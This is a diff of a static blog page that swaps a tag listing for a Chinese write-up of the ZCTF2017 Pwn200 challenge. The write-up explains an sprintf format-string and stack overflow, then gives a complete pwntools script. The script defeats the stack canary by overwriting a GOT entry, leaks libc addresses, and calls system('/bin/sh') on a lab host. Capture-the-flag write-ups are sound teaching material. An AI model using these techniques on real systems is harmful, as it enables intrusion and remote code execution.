@@ -6,14 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://niwbie.github.io">
-  <title>Tag: Linux | isee&#39;blog</title>
+  <title>ZCTF2017 Pwn200 | isee&#39;blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="isee'blog">
-<meta property="og:url" content="https://niwbie.github.io/tags/Linux/page/2/index.html">
+  <meta name="description" content="loginlibc这是一道sprintf的格式化利用的pwn，漏洞产生在这里：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZCTF2017 Pwn200">
+<meta property="og:url" content="https://niwbie.github.io/2017/03/01/ZCTF2017 Pwn200/index.html">
 <meta property="og:site_name" content="isee'blog">
+<meta property="og:description" content="loginlibc这是一道sprintf的格式化利用的pwn，漏洞产生在这里：">
+<meta property="og:updated_time" content="2017-04-14T09:27:22.008Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="isee'blog">
+<meta name="twitter:title" content="ZCTF2017 Pwn200">
+<meta name="twitter:description" content="loginlibc这是一道sprintf的格式化利用的pwn，漏洞产生在这里：">
   
     <link rel="alternative" href="/atom.xml" title="isee&#39;blog" type="application/atom+xml">
   
@@ -129,122 +133,175 @@
 </nav>
 
       <div class="body-wrap">
+        <article id="post-ZCTF2017 Pwn200" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
         
   
+    <h1 class="article-title" itemprop="name">
+      ZCTF2017 Pwn200
+    </h1>
   
-    
-    
       
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2016" class="archive-year">2016</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/03/22/Linux下的缓冲区溢出攻击(三)/" class="archive-article-date">
-  	<time datetime="2016-03-22T01:34:01.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/03/22/Linux下的缓冲区溢出攻击(三)/">Linux下的缓冲区溢出攻击(三)</a>
-    </h1>
-  
+        <p><a href="/image/ZCTF2017 Pwn200/login">login</a><br><a href="/image/ZCTF2017 Pwn200/libc-2.19.so">libc</a><br>这是一道sprintf的格式化利用的pwn，漏洞产生在这里：</p>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">int __cdecl succ(char *a1, char *a2, char *a3)</div><div class="line">&#123;</div><div class="line">  int result; // eax@1</div><div class="line">  int v4; // edx@1</div><div class="line">  char s; // [sp+1Ch] [bp-4Ch]@1</div><div class="line">  int v6; // [sp+5Ch] [bp-Ch]@1</div><div class="line"></div><div class="line">  v6 = *MK_FP(__GS__, 20);</div><div class="line">  sprintf(&amp;s, a1, a2, a3);</div><div class="line">  puts(&quot;Login successful!&quot;);</div><div class="line">  result = puts(&amp;s);</div><div class="line">  v4 = *MK_FP(__GS__, 20) ^ v6;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>由于a2和a3都是256字节，而s只有0x40自己，因此会导致栈溢出。可以利用栈溢出，覆盖栈上的格式化字符串”%s：%s”为”%hhn”造成格式化写<br>数据。<br>大致的原理是：<br>sprintf根据”%s:%s”,先读取s2的数据，利用s2覆盖”%s:%s”为 “%hhn”, 这样，当读取第二个%s的时候，实际上的的是我们的”%hhn”,这样就可以写入一个字节的数据。这道题中，将__stack_check_fail(0x80484a6)函数修改为alarm(0x8048490),这样就能绕过栈保护。后面再利用栈溢出，调用puts函数打印出read函数的地址，并根据给出的libc算出偏移得到system和”/bin/sh”的地址得到shell。</p>
+<p>具体的payload：<br>第一次输入数，先覆盖掉栈上的”%s:%s”：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload =  p32(stack_check_got) + (0x9c-0x50)*&apos;b&apos; + p32(main_addr) + (0xc6-0x9c-4)*&apos;c&apos; +  &apos;ccc%8x%10$hhn&apos;  # pass canary</div></pre></td></tr></table></figure>
+<p>这里是通过调试，最后算出%n的数值是0x90(具体为什么是这个也不知很清楚，是根据其数值调整’c’的数值得出来的)，这样即可将stack_check_got改为alarm，最后通过返回地址（main_addr）跳转到main函数。</p>
+<p>再次构造返回地址为puts，参数为read_got，打印read的真实地址:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = 0x50 * &apos;d&apos; + p32(elf.plt[&apos;puts&apos;]) + p32(main_addr) + p32(read_got)</div></pre></td></tr></table></figure>
+<p>最后调用system函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload = 0x50 * &apos;d&apos; + p32(system_addr) + p32(binsh_addr) + p32(binsh_addr)</div></pre></td></tr></table></figure>
+<p>完整的pwn：</p>
+<pre><code>from pwn import *
+#context.log_level = &apos;debug&apos;
+debug = 0
+if debug:
+    p = process(&apos;./login&apos;)
+    libc = ELF(&apos;./libc.so&apos;)
+else:
+    p = remote(&apos;192.168.17.68&apos;, 10001)
+    libc = ELF(&apos;./libc_l.so&apos;)
+elf = ELF(&apos;./login&apos;)
 
-        <div class="article-info info-on-right">
-          
+stack_check_got = 0x804a014
+puts_got = elf.got[&apos;puts&apos;]
+read_got = elf.got[&apos;read&apos;]  #0x804a00c
+main_addr =0x804878c
+
+print p.recv()
+
+payload =  p32(stack_check_got) + (0x9c-0x50)*&apos;b&apos; + p32(main_addr) + (0xc6-0x9c-4)*&apos;c&apos; +  &apos;cdf%8x%10$hhn&apos;  # pass canary
+p.sendline(payload)
+print p.recv()  
+
+p.sendline(p32(0))
+print p.recv()  #input your name
+
+payload = 0x50 * &apos;d&apos; + p32(elf.plt[&apos;puts&apos;]) + p32(main_addr) + p32(read_got)
+p.sendline(payload)
+print p.recv() #input password:
+p.sendline(p32(0) + &apos;k&apos;)
+
+p.recvuntil(&apos;:\n&apos;)  #puts(&amp;s)
+
+read_addr = p.recv(4)
+read_addr = u32(read_addr)
+print &apos;recv readaddr-&gt; &apos; + hex(read_addr)
+
+system_addr = read_addr -  (libc.symbols[&apos;read&apos;] - libc.symbols[&apos;system&apos;] )
+binsh_addr = read_addr -  (libc.symbols[&apos;read&apos;] - next(libc.search(&apos;/bin/sh&apos;)))
+
+print &apos;systemaddr-&gt; &apos; + hex(system_addr)
+print &apos;binaddr-&gt; &apos; + hex(binsh_addr)
+
+print p.recv()  #input name
+
+payload = 0x50 * &apos;d&apos; + p32(system_addr) + p32(binsh_addr) + p32(binsh_addr)
+p.sendline(payload)
+
+print p.recv()  #input password
+p.sendline(p32(0) + &apos;k&apos;)
+
+p.interactive()
+</code></pre>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      <a href="/2017/03/01/ZCTF2017 Pwn200/" class="archive-article-date">
+  	<time datetime="2017-03-01T03:32:39.000Z" itemprop="datePublished"><i class="icon-clock"></i>2017-03-01</time>
+</a>
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags"></i>
 		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
 	</div>
 
-          
+      
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/03/21/Linux下的缓冲区溢出攻击(二)/" class="archive-article-date">
-  	<time datetime="2016-03-21T06:15:25.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/03/21/Linux下的缓冲区溢出攻击(二)/">Linux下的缓冲区溢出攻击(二)</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
+  
+<nav id="article-nav">
+  
+    <a href="/2017/03/11/百度CTF-reverse1/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          百度CTF reverse1
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/02/27/ZCTF2017-reverse1-writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ZCTF2017 reverse1 writeup</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+	    <a class="jiathis_button_twitter"></a>
+	    <a class="jiathis_button_plus"></a> 
+	    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
 	</div>
+	<script type="text/javascript" src="//v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/03/21/Linux下的缓冲区溢出攻击(一)/" class="archive-article-date">
-  	<time datetime="2016-03-21T05:06:48.000Z" itemprop="datePublished"><i class="icon-clock"></i>2016-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/03/21/Linux下的缓冲区溢出攻击(一)/">Linux下的缓冲区溢出攻击(一)</a>
-    </h1>
-  
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/C/">C</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Linux/">Linux</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-	</div>
 
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
 
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/tags/Linux/">&laquo; Prev</a><a class="page-number" href="/tags/Linux/">1</a><span class="page-number current">2</span>
-    </nav>
-  
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="ZCTF2017 Pwn200" data-title="ZCTF2017 Pwn200" data-url="https://niwbie.github.io/2017/03/01/ZCTF2017 Pwn200/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"isee233"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
 
 
       </div>
@@ -267,9 +324,9 @@
 		mathjax: false,
 		animate: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false,
 		root: "/",
